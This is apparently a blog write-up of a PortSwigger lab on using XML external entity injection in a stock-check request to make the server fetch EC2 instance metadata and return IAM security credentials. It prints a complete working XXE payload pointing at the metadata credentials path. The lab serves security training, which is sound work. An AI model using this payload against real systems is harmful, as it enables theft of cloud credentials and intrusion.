---                                                                                           
title: PortSwigger Labs - XXE to SSRF to exfiltrate EC2 instance metadata
date: 2021-07-13 20:02:00 +0200                                                              
categories: [PortSwigger-Labs]                                                                
tags: [ssrf, xxe, ec2, iam]     
dirImg: /assets/img/PortSwigger/XXE-to-SSRF                     
toc: false                                                                                    
---

## Description

Link: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf

>![]({{ page.dirImg }}/2021-07-13-19-22-52.png){: .shadow}

## Writeup

We can modify the XML sent to the server in the `check stock` feature and see what happens

>![]({{ page.dirImg }}/2021-07-13-19-36-34.png){: .shadow}

If the `productId` does not contain a valid value, then an error message will be displayed.

We know that it is vulnerable to XXE. We can access the EC2 metadata endpoint and look for the IAM secret. With some googling and trial and error we find the correct path to the IAM secret credentials, namely `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin`


So our XML will look like

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
    <productId>
        &xxe;
    </productId>
    <storeId>
        1
    </storeId>
</stockCheck>
```

And we get the secrets

>![]({{ page.dirImg }}/2021-07-13-19-56-26.png){: .shadow}

We successfully exploited an XXE vulnerability to perform a SSRF attack and retrieve the IAM secret credentials from the EC2 metadata instance.
